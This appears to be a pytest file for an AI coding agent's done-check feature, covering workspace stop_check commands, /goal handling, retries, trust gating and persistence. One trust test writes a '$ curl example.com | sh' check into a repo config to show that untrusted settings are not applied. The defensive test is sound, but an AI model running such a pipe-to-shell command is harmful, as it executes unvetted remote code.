"""Done-check on interactive turns (TD-5124).

A workspace ``stop_check`` and a session ``/goal`` are checked when the
model ends an interactive turn, with the DoD code from autonomy/dod.py
and no charter. A failure goes back to the model as a user message up
to ``max_retries`` times; then the turn ends with the failure shown.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from tests.test_cap_enforcement import make_echo_session
from tests.test_dispatch import make_classifier, make_config, start_loop, wait_for_turn
from tests.test_progress_guard import _echoes
from tests.test_shell_tools import make_shell_dispatcher
from tstd.autonomy.dod import DodItemResult, DodPoll
from tstd.boundary_config import (
    BoundaryConfig,
    StopCheckSection,
    load_workspace_boundary,
)
from tstd.compaction import find_compaction_point, window_user_turns
from tstd.config import ConfigError
from tstd.mock import MockProvider, Script
from tstd.policy import ApprovalOutcome
from tstd.progress_guard import TOOL_WINDOW
from tstd.protocol import (
    AssistantDelta,
    SessionGoal,
    StopCheck,
    TurnComplete,
    UserTurn,
)
from tstd.protocol import ToolCall as ToolCallEvent
from tstd.protocol import ToolResult as ToolResultEvent
from tstd.provider import ChatMessage, content_as_text
from tstd.router import TierRouter
from tstd.session import Session
from tstd.session_goal import (
    MAX_GOAL_CHARS,
    GoalCommand,
    keep_goal_visible,
    parse_goal_command,
    restore_goal,
)
from tstd.session_persist import chat_message_from_dict, chat_message_to_dict
from tstd.stop_check import TurnStopCheck, clip_detail, feedback_text, outcome_for
from tstd.workspace_trust import TrustStore, read_view

# ── Helpers ──────────────────────────────────────────────────────────────


def _boundary(*checks: str, max_retries: int = 3) -> BoundaryConfig:
    return BoundaryConfig(stop_check=StopCheckSection(checks=list(checks), max_retries=max_retries))


def _checks(session: Session) -> list[StopCheck]:
    return [e for e in session.event_log.all_events if isinstance(e, StopCheck)]


def _turns(session: Session) -> list[TurnComplete]:
    return [e for e in session.event_log.all_events if isinstance(e, TurnComplete)]


def _brain(mock: MockProvider) -> list[Any]:
    return [call for call in mock.calls if call.model == "test-brain"]


def _worker(mock: MockProvider) -> list[Any]:
    return [call for call in mock.calls if call.model == "test-worker"]


def _last_user(request: Any) -> str:
    users = [m for m in request.messages if m.role == "user"]
    return content_as_text(users[-1].content) if users else ""


def _deltas(session: Session) -> str:
    return "".join(e.delta for e in session.event_log.all_events if isinstance(e, AssistantDelta))


async def _shell_run(
    tmp_path: Path,
    brain: list[Script],
    boundary: BoundaryConfig,
    *,
    message: str = "build the feature",
    deny: bool = False,
    deny_only: str | None = None,
    worker: tuple[str, ...] = (),
    plan: bool = False,
) -> tuple[Session, MockProvider, Any]:
    session = Session(str(tmp_path))
    session.boundary_config = boundary
    dispatcher = make_shell_dispatcher(tmp_path)
    if deny or deny_only is not None:

        async def _deny(
            _call_id: str, _tool: object, arguments: dict[str, Any], *_rest: object
        ) -> ApprovalOutcome:
            if deny_only is not None and deny_only not in str(arguments.get("command")):
                return ApprovalOutcome(True, "")
            return ApprovalOutcome(False, "The user declined this command.")

        dispatcher.approval_handler = _deny
    sequences: dict[str, list[Script]] = {"test-brain": brain}
    if worker:
        sequences["test-worker"] = [Script(kind="text", content=v) for v in worker]
    mock = MockProvider(sequences=sequences)
    router = TierRouter(lead_turns=80)
    router.set_plan(plan)
    runner = await start_loop(session, router, mock, make_config(), dispatcher.registry, dispatcher)
    await session.add_user_message(message)
    return session, mock, runner


async def _text_run(
    tmp_path: Path,
    brain: list[Script],
    worker: list[str],
    boundary: BoundaryConfig,
    *,
    messages: tuple[str, ...] = ("build the feature",),
) -> tuple[Session, MockProvider, Any]:
    session, dispatcher = make_echo_session(tmp_path, boundary)
    # A stub classifier: the worker's scripted verdicts are the check's alone.
    dispatcher.classifier = make_classifier(str(tmp_path))
    mock = MockProvider(
        sequences={
            "test-brain": brain,
            "test-worker": [Script(kind="text", content=v) for v in worker],
        }
    )
    runner = await start_loop(
        session, TierRouter(lead_turns=80), mock, make_config(), dispatcher.registry, dispatcher
    )
    for text in messages:
        await session.add_user_message(text)
    return session, mock, runner


def _say(text: str) -> Script:
    return Script(kind="stream", content=text)


# ── The workspace setting ────────────────────────────────────────────────


class TestConfig:
    def test_a_workspace_sets_a_stop_check(self, tmp_path: Path) -> None:
        (tmp_path / ".tst").mkdir()
        (tmp_path / ".tst" / "config.yaml").write_text(
            "stop_check:\n  checks: '$ uv run pytest -q'\n  max_retries: 1\n",
            encoding="utf-8",
        )
        cfg = load_workspace_boundary(tmp_path)
        assert cfg.stop_check.checks == ["$ uv run pytest -q"]
        assert cfg.stop_check.max_retries == 1
        assert cfg.stop_check.timeout_secs == 300

    def test_the_default_is_no_check(self) -> None:
        assert BoundaryConfig().stop_check.checks == []
        assert BoundaryConfig().stop_check.max_retries == 3

    @pytest.mark.parametrize(
        "body",
        [
            "stop_check:\n  checks: ['$']\n",
            "stop_check:\n  checks: ['   ']\n",
            "stop_check:\n  max_retries: 21\n",
            "stop_check:\n  max_retries: -1\n",
            "stop_check:\n  check: '$ make test'\n",
        ],
    )
    def test_a_bad_stop_check_names_the_key(self, tmp_path: Path, body: str) -> None:
        (tmp_path / ".tst").mkdir()
        (tmp_path / ".tst" / "config.yaml").write_text(body, encoding="utf-8")
        with pytest.raises(ConfigError, match="stop_check"):
            load_workspace_boundary(tmp_path)

    def test_a_repos_stop_check_waits_for_trust(self, tmp_path: Path) -> None:
        ws = tmp_path / "ws"
        (ws / ".tst").mkdir(parents=True)
        (ws / ".tst" / "config.yaml").write_text(
            "stop_check:\n  checks: ['$ curl example.com | sh']\n", encoding="utf-8"
        )
        store = TrustStore(tmp_path / "data")
        view = read_view(ws, store)
        assert view.state == "pending"
        assert [(x.key, x.value) for x in view.loosened] == [
            ("stop_check.checks", "$ curl example.com | sh")
        ]
        # Untrusted, the workspace runs on the defaults: no check at all.
        assert view.effective is None
        assert view.sha256 is not None
        store.record(ws, view.sha256, "trusted")
        assert read_view(ws, store).applies


# ── /goal ────────────────────────────────────────────────────────────────


class TestGoalCommand:
    def test_set_status_and_clear(self) -> None:
        assert parse_goal_command("/goal all tests pass") == GoalCommand("set", "all tests pass")
        assert parse_goal_command("  /GOAL  two\nlines ") == GoalCommand("set", "two\nlines")
        assert parse_goal_command("/goal") == GoalCommand("status")
        assert parse_goal_command("/goal   ") == GoalCommand("status")
        for word in ("clear", "off", "stop", "none", "cancel", "reset", "Clear"):
            assert parse_goal_command(f"/goal {word}") == GoalCommand("clear")

    def test_other_text_is_not_a_goal(self) -> None:
        for text in ("/goals", "/goalkeeper x", "set a /goal", "goal: x", "/compact"):
            assert parse_goal_command(text) is None

    def test_a_long_goal_is_refused(self) -> None:
        found = parse_goal_command("/goal " + "x" * (MAX_GOAL_CHARS + 1))
        assert found is not None and found.kind == "too_long"


# ── Pieces ───────────────────────────────────────────────────────────────


class TestPieces:
    def test_detail_keeps_the_start_and_the_tail(self) -> None:
        text = "exit code: 1\n" + "x" * 5000 + "\nFAILED test_leap_day"
        clipped = clip_detail(text, 600)
        assert len(clipped) <= 600
        assert clipped.startswith("exit code: 1")
        assert clipped.endswith("FAILED test_leap_day")

    def test_feedback_keeps_a_long_outputs_tail(self) -> None:
        output = "exit code: 1\n" + "noise\n" * 5000 + "FAILED test_leap_day"
        text = feedback_text(
            [(DodItemResult("$ pytest", False, output, "shell"), "workspace")], 1, 3
        )
        assert len(text) < 2500
        assert "FAILED test_leap_day" in text

    def test_outcomes(self) -> None:
        red = DodPoll((DodItemResult("x", False, "RED", "worker"),))
        green = DodPoll((DodItemResult("x", True, "GREEN", "worker"),))
        unknown = DodPoll(
            (
                DodItemResult("x", True, "GREEN", "worker"),
                DodItemResult("y", False, "?", "worker", decided=False),
            )
        )
        assert outcome_for(green, 1, 3) == "passed"
        assert outcome_for(red, 3, 3) == "retry"
        assert outcome_for(red, 4, 3) == "failed"
        assert outcome_for(red, 1, 0) == "failed"
        assert outcome_for(unknown, 1, 3) == "unchecked"
        only_unknown = DodPoll((DodItemResult("y", False, "?", "worker", decided=False),))
        assert outcome_for(only_unknown, 1, 3) == "unchecked"

    def test_a_red_item_wins_over_one_that_could_not_be_judged(self) -> None:
        mixed = DodPoll(
            (
                DodItemResult("$ false", False, "exit code: 1", "shell"),
                DodItemResult("The README is updated", False, "Hmm", "worker", decided=False),
            )
        )
        assert outcome_for(mixed, 1, 3) == "retry"
        assert outcome_for(mixed, 4, 3) == "failed"
        assert outcome_for(mixed, 1, 0) == "failed"
        # Only the red item goes back: the model cannot fix the other.
        text = feedback_text([(result, "workspace") for result in mixed.results], 1, 3)
        assert "`$ false` failed" in text
        assert "README" not in text

    def test_no_check_for_unattended_runs_or_delegates(self) -> None:
        session = Session("/tmp/ws")
        session.boundary_config = _boundary("$ true")
        session.goal = "done"
        check = TurnStopCheck(session, None, None)
        assert [source for _, source in check.items()] == ["workspace", "goal"]
        session.autonomy = True
        assert check.items() == []
        session.autonomy = False
        session.delegate_depth = 1
        assert check.items() == []

    def test_no_check_while_planning(self) -> None:
        session = Session("/tmp/ws")
        session.boundary_config = _boundary("$ true")
        session.goal = "done"
        session.router = TierRouter()
        check = TurnStopCheck(session, None, None)
        session.router.set_plan(True)
        assert check.items() == []
        session.router.set_plan(False)
        assert [source for _, source in check.items()] == ["workspace", "goal"]

    def test_feedback_is_no_window_turn_and_no_cut_point(self) -> None:
        convo = [
            ChatMessage(role="system", content="sys"),
            ChatMessage(role="user", content="first"),
            ChatMessage(role="assistant", content="done"),
            ChatMessage(role="user", content="check failed", steer=True, check=True),
            ChatMessage(role="assistant", content="fixed"),
            ChatMessage(role="user", content="second"),
        ]
        assert window_user_turns(convo) == [1, 5]
        assert find_compaction_point(convo, keep_user_turns=1) == 5
        assert find_compaction_point(convo, keep_user_turns=2) == 0

    def test_the_check_flag_is_saved(self) -> None:
        message = ChatMessage(role="user", content="check failed", steer=True, check=True)
        row = chat_message_to_dict(message)
        assert row["check"] is True
        back = chat_message_from_dict(json.loads(json.dumps(row)))
        assert back.check and back.steer
        assert not chat_message_from_dict({"role": "user", "content": "hi"}).check

    async def test_the_goal_survives_a_restart_and_a_rotation(self) -> None:
        session = Session("/tmp/ws")
        restore_goal(
            session,
            [
                SessionGoal(session_id="s", goal="old", change="set", seq=1),
                SessionGoal(session_id="s", goal="leap days work", change="set", seq=2),
            ],
        )
        assert session.goal == "leap days work"
        await keep_goal_visible(session)
        logged = [e for e in session.event_log.all_events if isinstance(e, SessionGoal)]
        assert [e.goal for e in logged] == ["leap days work"]
        await keep_goal_visible(session)
        assert len([e for e in session.event_log.all_events if isinstance(e, SessionGoal)]) == 1
        cleared = Session("/tmp/ws")
        restore_goal(cleared, [SessionGoal(session_id="s", goal=None, change="met", seq=1)])
        assert cleared.goal is None


# ── The loop ─────────────────────────────────────────────────────────────


class TestShellCheck:
    async def test_a_planning_turn_is_not_checked(self, tmp_path: Path) -> None:
        # TD-5123 x TD-5124: plan mode is read-only research ending in a
        # plan; a done-check would send the model back to fix what it may
        # not touch. The first turn after plan mode is checked as usual.
        brain = [_say("Here is what I found."), _say("Done.")]
        session, mock, runner = await _shell_run(
            tmp_path, brain, _boundary("$ false", max_retries=0), message="plan it", plan=True
        )
        turn = await wait_for_turn(session, 1, 10.0)
        assert turn.failed is False and turn.error_code is None
        assert _checks(session) == []
        assert len(_brain(mock)) == 1
        assert session.router is not None
        session.router.set_plan(False)
        await session.add_user_message("now build it")
        turn = await wait_for_turn(session, 2, 10.0)
        assert [c.outcome for c in _checks(session)] == ["failed"]
        assert turn.failed is True and turn.error_code == "stop_check_failed"
        await runner.cancel()

    async def test_a_failure_goes_back_until_the_check_passes(self, tmp_path: Path) -> None:
        brain = [
            _say("All done."),
            Script(
                kind="tool_call",
                tool_name="shell",
                tool_arguments=json.dumps({"command": "touch done.txt"}),
            ),
            _say("Now it is really done."),
        ]
        session, mock, runner = await _shell_run(tmp_path, brain, _boundary("$ test -f done.txt"))
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is False and turn.error_code is None
        checks = _checks(session)
        assert [c.outcome for c in checks] == ["retry", "passed"]
        assert [c.attempt for c in checks] == [1, 2]
        assert checks[0].items[0].via == "shell"
        assert checks[0].items[0].passed is False
        assert "exit code: 1" in checks[0].items[0].detail
        calls = _brain(mock)
        assert len(calls) == 3
        # The failure went back to the model as a user message ...
        feedback = _last_user(calls[1])
        assert "done-check failed" in feedback
        assert "`$ test -f done.txt` failed" in feedback
        assert "exit code: 1" in feedback
        # ... which is no user turn of its own in the window.
        assert len([e for e in session.event_log.all_events if isinstance(e, UserTurn)]) == 1
        assert window_user_turns(session.conversation) == [1]
        # Each check command is logged as a tool call with its result.
        check_calls = [
            e
            for e in session.event_log.all_events
            if isinstance(e, ToolCallEvent) and e.tool_call_id.startswith("check-")
        ]
        assert len(check_calls) == 2
        assert check_calls[0].arguments["command"] == "test -f done.txt"
        assert check_calls[0].arguments["timeout_secs"] == 300
        results = {
            e.tool_call_id: e
            for e in session.event_log.all_events
            if isinstance(e, ToolResultEvent)
        }
        assert all(c.tool_call_id in results for c in check_calls)
        assert len(_turns(session)) == 1
        await runner.cancel()

    async def test_the_turn_ends_failed_after_max_retries(self, tmp_path: Path) -> None:
        brain = [_say("Done."), _say("Done, really."), _say("Should not be asked.")]
        session, mock, runner = await _shell_run(
            tmp_path, brain, _boundary("$ false", max_retries=1)
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is True
        assert turn.error_code == "stop_check_failed"
        assert [c.outcome for c in _checks(session)] == ["retry", "failed"]
        assert len(_brain(mock)) == 2
        await runner.cancel()

    async def test_max_retries_zero_checks_but_never_sends_back(self, tmp_path: Path) -> None:
        session, mock, runner = await _shell_run(
            tmp_path, [_say("Done."), _say("x")], _boundary("$ false", max_retries=0)
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.error_code == "stop_check_failed"
        assert [c.outcome for c in _checks(session)] == ["failed"]
        assert len(_brain(mock)) == 1
        await runner.cancel()

    async def test_a_declined_command_ends_the_turn_unchecked(self, tmp_path: Path) -> None:
        session, mock, runner = await _shell_run(
            tmp_path, [_say("Done."), _say("x")], _boundary("$ make check"), deny=True
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is False
        [check] = _checks(session)
        assert check.outcome == "unchecked"
        assert check.items[0].decided is False
        assert len(_brain(mock)) == 1
        denied = [
            e
            for e in session.event_log.all_events
            if isinstance(e, ToolResultEvent) and e.tool_call_id.startswith("check-")
        ]
        assert [e.error_code for e in denied] == ["approval_denied"]
        await runner.cancel()

    async def test_a_red_command_goes_back_beside_an_unjudged_statement(
        self, tmp_path: Path
    ) -> None:
        # The worker has an 8-token verdict cap, so a reasoning model may
        # answer with no verdict; the `$` failure must still go back.
        session, mock, runner = await _shell_run(
            tmp_path,
            [_say("Done."), _say("Done, really."), _say("Should not be asked.")],
            _boundary("$ false", "The README is updated", max_retries=1),
            worker=("Let me think about", "Let me think about"),
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is True
        assert turn.error_code == "stop_check_failed"
        checks = _checks(session)
        assert [c.outcome for c in checks] == ["retry", "failed"]
        assert [(i.passed, i.decided) for i in checks[0].items] == [(False, True), (False, False)]
        calls = _brain(mock)
        assert len(calls) == 2
        feedback = _last_user(calls[1])
        assert "`$ false` failed" in feedback
        assert "README" not in feedback
        await runner.cancel()

    async def test_a_red_command_goes_back_beside_a_declined_one(self, tmp_path: Path) -> None:
        session, mock, runner = await _shell_run(
            tmp_path,
            [_say("Done."), _say("Done, really.")],
            _boundary("$ make check", "$ test -f done.txt", max_retries=1),
            deny_only="make check",
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.error_code == "stop_check_failed"
        assert [c.outcome for c in _checks(session)] == ["retry", "failed"]
        first = _checks(session)[0]
        assert [(i.passed, i.decided) for i in first.items] == [(False, False), (False, True)]
        feedback = _last_user(_brain(mock)[1])
        assert "`$ test -f done.txt` failed" in feedback
        assert "make check" not in feedback
        await runner.cancel()

    async def test_no_check_no_change(self, tmp_path: Path) -> None:
        session, mock, runner = await _shell_run(tmp_path, [_say("Done.")], BoundaryConfig())
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is False
        assert _checks(session) == []
        assert len(_brain(mock)) == 1
        await runner.cancel()


class TestWorkerCheckAndGoal:
    async def test_a_statement_is_judged_by_the_worker(self, tmp_path: Path) -> None:
        session, mock, runner = await _text_run(
            tmp_path,
            [_say("Started."), _say("The README lists --fast now.")],
            ["RED", "GREEN"],
            _boundary("The README documents every new flag"),
        )
        await wait_for_turn(session, 1, 10.0)
        assert [c.outcome for c in _checks(session)] == ["retry", "passed"]
        assert _checks(session)[0].items[0].via == "worker"
        feedback = _last_user(_brain(mock)[1])
        assert "Not true yet: The README documents every new flag" in feedback
        prompt = _last_user(_worker(mock)[0])
        assert "Item: The README documents every new flag" in prompt
        assert "Objective: build the feature" in prompt
        assert "Last assistant: Started." in prompt
        await runner.cancel()

    async def test_goal_sets_works_and_is_met(self, tmp_path: Path) -> None:
        session, mock, runner = await _text_run(
            tmp_path,
            [_say("Partly."), _say("Leap days parse now.")],
            ["RED", "GREEN"],
            BoundaryConfig(),
            messages=("/goal the parser handles leap days",),
        )
        turn = await wait_for_turn(session, 1, 10.0)
        assert turn.failed is False
        first = _last_user(_brain(mock)[0])
        assert first.startswith("Goal for this session: the parser handles leap days")
        assert "/goal" not in first
        [user] = [e for e in session.event_log.all_events if isinstance(e, UserTurn)]
        assert user.content == "/goal the parser handles leap days"
        checks = _checks(session)
        assert [c.outcome for c in checks] == ["retry", "passed"]
        assert checks[0].items[0].source == "goal"
        assert "Goal not met yet: the parser handles leap days" in _last_user(_brain(mock)[1])
        goals = [e for e in session.event_log.all_events if isinstance(e, SessionGoal)]
        assert [(g.goal, g.change) for g in goals] == [
            ("the parser handles leap days", "set"),
            (None, "met"),
        ]
        assert session.goal is None
        await runner.cancel()

    async def test_a_failing_goal_stays_set(self, tmp_path: Path) -> None:
        session, _mock, runner = await _text_run(
            tmp_path,
            [_say("No."), _say("Still no.")],
            ["RED", "RED"],
            _boundary(max_retries=1),
            messages=("/goal ship it",),
        )
        turn = await wait_for_turn(session, 1, 10.0)
        assert turn.error_code == "stop_check_failed"
        assert session.goal == "ship it"
        assert session.goal_checks == 2
        await runner.cancel()

    async def test_goal_status_and_clear_need_no_model(self, tmp_path: Path) -> None:
        session, mock, runner = await _text_run(
            tmp_path,
            [],
            [],
            BoundaryConfig(),
            messages=("/goal", "/goal clear"),
        )
        await wait_for_turn(session, 2, 10.0)
        assert _brain(mock) == []
        assert "No goal set." in _deltas(session)
        assert _checks(session) == []
        session.goal = "ship it"
        await session.add_user_message("/goal")
        await wait_for_turn(session, 3, 10.0)
        assert "Goal: ship it" in _deltas(session)
        await session.add_user_message("/goal off")
        await wait_for_turn(session, 4, 10.0)
        assert "Goal cleared: ship it" in _deltas(session)
        assert session.goal is None
        assert _brain(mock) == []
        # Both sides of each exchange are in the conversation, so the
        # window's user-turn numbers still line up with it.
        assert len(window_user_turns(session.conversation)) == 4
        await runner.cancel()

    async def test_the_progress_guards_done_runs_the_check(self, tmp_path: Path) -> None:
        brain = _echoes(
            TOOL_WINDOW,
            _say("DONE: the arrow is in"),
            _say("Now the arrow really is in."),
        )["test-brain"]
        session, _mock, runner = await _text_run(
            tmp_path, brain, ["RED", "GREEN"], _boundary("The arrow is in")
        )
        turn = await wait_for_turn(session, 1, 15.0)
        assert turn.failed is False
        assert [c.outcome for c in _checks(session)] == ["retry", "passed"]
        assert "Now the arrow really is in." in _deltas(session)
        await runner.cancel()


# ── Restart ──────────────────────────────────────────────────────────────


async def test_a_revived_session_keeps_its_goal(tmp_path: Path) -> None:
    from tests.test_queued_restart import SID, _restored, _stop

    events = [SessionGoal(session_id=SID, goal="leap days work", change="set", seq=1)]
    daemon = await _restored(tmp_path, [], events)
    try:
        session = daemon.session_registry.get(SID)
        assert session is not None
        assert session.goal == "leap days work"
    finally:
        await _stop(daemon)


async def test_a_goal_rotated_out_by_a_long_step_survives_a_restart(tmp_path: Path) -> None:
    from tests.test_queued_restart import SID, _seed, _stop
    from tstd.daemon import Daemon
    from tstd.session_persist import SessionPersist

    data_dir, workspace = tmp_path / "data", tmp_path / "ws"
    data_dir.mkdir()
    workspace.mkdir()
    goal = SessionGoal(session_id=SID, goal="leap days work", change="set", seq=1)
    await _seed(data_dir, workspace, [], [goal])

    daemon = Daemon(data_dir=data_dir, provider=MockProvider(default=Script(kind="stream")))
    daemon._session_persist = SessionPersist(data_dir, log_max_events=5)
    await daemon._restore_sessions()
    try:
        session = daemon.session_registry.get(SID)
        assert session is not None and session.goal == "leap days work"
        for n in range(12):
            await session.event_log.add(AssistantDelta(session_id=SID, delta=f"chunk {n}", seq=1))
        assert any(isinstance(e, SessionGoal) for e in session.event_log.all_events)
    finally:
        await _stop(daemon)

    loaded = SessionPersist(data_dir, log_max_events=5).load(SID)
    assert loaded is not None
    revived = Session(str(workspace))
    restore_goal(revived, loaded.events)
    assert revived.goal == "leap days work"


def test_tst_run_prints_one_line_per_check() -> None:
    from tstd.cli import _visible_event_line, stop_check_notice

    event = json.loads(
        StopCheck(
            session_id="s",
            outcome="retry",
            attempt=1,
            max_retries=3,
            items=[
                {"item": "$ npm test", "source": "workspace", "via": "shell", "passed": False},
                {"item": "ship it", "source": "goal", "via": "worker", "passed": True},
            ],
            seq=1,
        ).model_dump_json()
    )
    assert stop_check_notice(event) == (
        "(done-check failed, try 1 of 3: $ npm test; the agent keeps working)"
    )
    assert _visible_event_line(event) == stop_check_notice(event)
    assert stop_check_notice({**event, "outcome": "passed"}) == "(done-check passed)"
    assert stop_check_notice({**event, "outcome": "failed"}) == (
        "(done-check still failing after 3 tries: $ npm test)"
    )
    assert stop_check_notice({**event, "outcome": "unchecked"}).startswith(
        "(done-check could not run"
    )
